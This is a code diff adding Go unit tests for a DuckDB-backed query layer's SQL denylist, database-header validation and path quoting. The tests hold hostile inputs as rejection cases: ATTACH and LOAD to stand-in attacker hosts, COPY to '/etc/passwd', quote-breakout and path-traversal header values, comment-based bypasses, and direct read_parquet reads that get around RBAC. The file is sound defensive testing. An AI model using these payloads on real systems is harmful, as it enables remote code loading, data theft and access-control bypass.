@@ -63,6 +63,26 @@ func TestExtractCTENames(t *testing.T) {
 			sql:      "WITH hourly_avg AS (SELECT host, AVG(value) as avg_val FROM mydb.cpu WHERE time > '2024-01-01' GROUP BY host) SELECT * FROM hourly_avg",
 			expected: []string{"hourly_avg"},
 		},
+		// C3 regression: parenthesized column lists in CTE definitions
+		// must still be recognised. Without the fix, `foo` here would
+		// not be in the CTE-name map and the table resolver would treat
+		// it as a real measurement, breaking the query AND leaking the
+		// CTE name through RBAC as if it referenced a real table.
+		{
+			name:     "CTE with parenthesized column list",
+			sql:      "WITH foo(c1, c2) AS (SELECT a, b FROM cpu) SELECT * FROM foo",
+			expected: []string{"foo"},
+		},
+		{
+			name:     "RECURSIVE CTE with column list",
+			sql:      "WITH RECURSIVE tree(id, parent) AS (SELECT * FROM nodes) SELECT * FROM tree",
+			expected: []string{"tree"},
+		},
+		{
+			name:     "multiple CTEs second one has column list",
+			sql:      "WITH a AS (SELECT 1), b(c1, c2) AS (SELECT 2, 3) SELECT * FROM a, b",
+			expected: []string{"a", "b"},
+		},
 	}
 
 	for _, tt := range tests {
@@ -622,16 +642,175 @@ func TestDangerousSQLPatterns(t *testing.T) {
 		{name: "INSERT INTO", sql: "INSERT INTO users VALUES (1)", shouldFail: true},
 		{name: "UPDATE SET", sql: "UPDATE users SET name = 'hacked'", shouldFail: true},
 
+		// RCE / file-system / extension-loading class (security review C1)
+		{name: "ATTACH remote DB", sql: "ATTACH 'http://attacker/db' AS evil", shouldFail: true},
+		{name: "ATTACH paren form", sql: "ATTACH('s3://bucket/db.duckdb', 'evil')", shouldFail: true},
+		{name: "DETACH", sql: "DETACH evil", shouldFail: true},
+		{name: "COPY TO", sql: "COPY (SELECT * FROM users) TO '/etc/passwd'", shouldFail: true},
+		{name: "COPY FROM", sql: "COPY users FROM '/tmp/payload.csv'", shouldFail: true},
+		{name: "EXPORT DATABASE", sql: "EXPORT DATABASE 'attacker.db'", shouldFail: true},
+		{name: "IMPORT DATABASE", sql: "IMPORT DATABASE 'attacker.db'", shouldFail: true},
+		{name: "PRAGMA settings change", sql: "PRAGMA enable_external_access=true", shouldFail: true},
+		{name: "SET GLOBAL var", sql: "SET GLOBAL extension_directory='/tmp/x'", shouldFail: true},
+		{name: "SET session var", sql: "SET enable_external_access=true", shouldFail: true},
+		{name: "LOAD extension", sql: "LOAD 'http://attacker/evil.so'", shouldFail: true},
+		{name: "INSTALL extension", sql: "INSTALL httpfs", shouldFail: true},
+		{name: "CALL procedure", sql: "CALL pragma_database_list()", shouldFail: true},
+
 		// Case variations
 		{name: "drop table lowercase", sql: "drop table users", shouldFail: true},
 		{name: "DROP TABLE mixed case", sql: "DrOp TaBlE users", shouldFail: true},
+		{name: "load lowercase", sql: "load httpfs", shouldFail: true},
+		{name: "attach mixed case", sql: "AtTaCh 'evil' AS x", shouldFail: true},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			matched := dangerousSQLPattern.MatchString(tt.sql)
+			// Test through the full validation pipeline (mask literals,
+			// strip comments, then run denylist) — not just the raw
+			// regex — because the comment/literal-injection bypasses
+			// (e.g. `DROP /* */ TABLE`, `SELECT 'DROP TABLE x'`) only
+			// behave correctly through the pipeline. See
+			// TestValidateSQLRequest_BypassesAndFalsePositives.
+			err := ValidateSQLRequest(tt.sql)
+			matched := err != nil
 			if matched != tt.shouldFail {
-				t.Errorf("dangerousSQLPattern for %q: matched=%v, shouldFail=%v", tt.sql, matched, tt.shouldFail)
+				t.Errorf("ValidateSQLRequest for %q: matched=%v, shouldFail=%v (err=%v)", tt.sql, matched, tt.shouldFail, err)
+			}
+		})
+	}
+}
+
+// TestValidateHeaderDatabase covers the x-arc-database header
+// validation gate added for C2 (review/query-path-criticals). The
+// header value is interpolated into read_parquet('<base>/<db>/...')
+// paths; without validation an attacker breaks out of the literal.
+// Empty header is allowed (handlers fall back to default DB).
+func TestValidateHeaderDatabase(t *testing.T) {
+	tests := []struct {
+		name       string
+		header     string
+		shouldFail bool
+	}{
+		// Legitimate values
+		{name: "empty header allowed", header: "", shouldFail: false},
+		{name: "simple name", header: "production", shouldFail: false},
+		{name: "with underscore", header: "my_db", shouldFail: false},
+		{name: "with hyphen", header: "my-db", shouldFail: false},
+		{name: "alphanumeric", header: "db123", shouldFail: false},
+
+		// SQL-injection vectors — all must reject
+		{name: "single quote", header: "evil'", shouldFail: true},
+		{name: "double quote", header: `evil"`, shouldFail: true},
+		{name: "newline", header: "evil\nDROP TABLE", shouldFail: true},
+		{name: "carriage return", header: "evil\rDROP", shouldFail: true},
+		{name: "null byte", header: "evil\x00", shouldFail: true},
+		{name: "tab", header: "evil\ttable", shouldFail: true},
+		{name: "space", header: "evil db", shouldFail: true},
+		{name: "comma in literal", header: "x', enable_external_access=true) UNION SELECT 1 FROM read_parquet('y", shouldFail: true},
+		{name: "backslash", header: "evil\\path", shouldFail: true},
+		{name: "path traversal dotdot", header: "../etc", shouldFail: true},
+		{name: "path traversal slash", header: "a/b", shouldFail: true},
+
+		// Boundary
+		{name: "starts with digit", header: "1db", shouldFail: true},
+		{name: "starts with hyphen", header: "-db", shouldFail: true},
+		{name: "too long", header: strings.Repeat("a", 129), shouldFail: true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := validateHeaderDatabase(tt.header)
+			gotErr := err != nil
+			if gotErr != tt.shouldFail {
+				t.Errorf("validateHeaderDatabase(%q): err=%v, shouldFail=%v", tt.header, err, tt.shouldFail)
+			}
+		})
+	}
+}
+
+// TestQuotePath ensures every user-controlled path interpolated into
+// `read_parquet('PATH')` gets its single quotes doubled, regardless
+// of input shape. This is the single source of truth helper for path
+// quoting in the query layer; if a future call site bypasses it,
+// gemini will catch the regression in PR review.
+func TestQuotePath(t *testing.T) {
+	tests := []struct {
+		in   string
+		want string
+	}{
+		{in: "s3://bucket/db/m/**/*.parquet", want: "'s3://bucket/db/m/**/*.parquet'"},
+		{in: "/data/db/m/**/*.parquet", want: "'/data/db/m/**/*.parquet'"},
+		{in: "evil'; DROP TABLE x; --", want: "'evil''; DROP TABLE x; --'"},
+		{in: "name with 'embedded' quotes", want: "'name with ''embedded'' quotes'"},
+		// Each quote char in input becomes two on output (DuckDB literal-
+		// escape rule); two-quote input → 4 inner + 2 outer = 6 chars.
+		{in: "''", want: "''''''"},
+		{in: "", want: "''"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.in, func(t *testing.T) {
+			got := quotePath(tt.in)
+			if got != tt.want {
+				t.Errorf("quotePath(%q) = %q, want %q", tt.in, got, tt.want)
+			}
+		})
+	}
+}
+
+// TestValidateSQLRequest_BypassesAndFalsePositives covers the
+// normalisation pipeline: comment-stripping must happen before the
+// denylist (so `DROP /* */ TABLE` does not slip past `\b...\b`), and
+// string-literal masking must happen before the denylist (so
+// `SELECT 'DROP TABLE x'` does not false-positive). Both quoted-
+// identifier and quoted-string forms must be tolerated.
+func TestValidateSQLRequest_BypassesAndFalsePositives(t *testing.T) {
+	tests := []struct {
+		name       string
+		sql        string
+		shouldFail bool
+	}{
+		// Comment-injection bypasses — must still be blocked.
+		{name: "DROP block-comment between keywords", sql: "DROP /* */ TABLE users", shouldFail: true},
+		{name: "DROP dash-comment then newline", sql: "DROP --evil\nTABLE users", shouldFail: true},
+		{name: "ATTACH block-comment", sql: "ATTACH /* sneaky */ 'evil' AS x", shouldFail: true},
+		{name: "LOAD block-comment", sql: "LOAD /**/'http://x'", shouldFail: true},
+
+		// String-literal false-positives — must NOT be blocked.
+		{name: "literal contains DROP TABLE", sql: "SELECT * FROM logs WHERE msg = 'DROP TABLE users'", shouldFail: false},
+		{name: "literal contains LOAD", sql: "SELECT * FROM logs WHERE event = 'LOAD failed'", shouldFail: false},
+		{name: "literal contains ATTACH", sql: "SELECT 'attach this' AS note FROM t", shouldFail: false},
+		{name: "literal contains SET GLOBAL", sql: "SELECT * FROM t WHERE msg LIKE '%SET GLOBAL foo=%'", shouldFail: false},
+
+		// Quoted-identifier false-positives — must NOT be blocked
+		// (column literally named COPY/LOAD etc.). MaskStringLiterals
+		// masks both single and double quotes.
+		{name: "double-quoted COPY identifier", sql: `SELECT "COPY" FROM t`, shouldFail: false},
+		{name: "double-quoted LOAD identifier", sql: `SELECT "LOAD", x FROM t`, shouldFail: false},
+
+		// Comment + literal interaction — comment inside literal must NOT be stripped first.
+		{name: "literal containing /* */ keeps inner DROP TABLE blocked? NO -- inside literal", sql: "SELECT 'a /* */ DROP TABLE x' FROM t", shouldFail: false},
+
+		// C3 regression: user SQL with direct read_parquet() must be
+		// rejected to close the RBAC bypass vector. Only Arc's transform
+		// layer emits read_parquet — any occurrence in raw input lets
+		// the user route around the table-name → path mapping that RBAC
+		// depends on (e.g. a user scoped to db1.m1 reads /data/db2/secrets).
+		{name: "user read_parquet direct", sql: "SELECT * FROM read_parquet('/data/db2/secrets/**/*.parquet')", shouldFail: true},
+		{name: "user read_parquet uppercase", sql: "SELECT * FROM READ_PARQUET('/data/x/*.parquet')", shouldFail: true},
+		{name: "user read_parquet whitespace before paren", sql: "SELECT * FROM read_parquet  ('/data/x/*.parquet')", shouldFail: true},
+		{name: "user read_parquet inside CTE body", sql: "WITH evil AS (SELECT * FROM read_parquet('/data/x/*.parquet')) SELECT * FROM evil", shouldFail: true},
+		{name: "user read_parquet in JOIN", sql: "SELECT * FROM cpu JOIN read_parquet('/data/x/*.parquet') ON cpu.id = x.id", shouldFail: true},
+		// Allow read_parquet inside a string literal (it'd be a column value).
+		{name: "literal containing read_parquet text", sql: "SELECT * FROM logs WHERE msg = 'read_parquet failed'", shouldFail: false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateSQLRequest(tt.sql)
+			matched := err != nil
+			if matched != tt.shouldFail {
+				t.Errorf("ValidateSQLRequest for %q: matched=%v, shouldFail=%v (err=%v)", tt.sql, matched, tt.shouldFail, err)
 			}
 		})
 	}
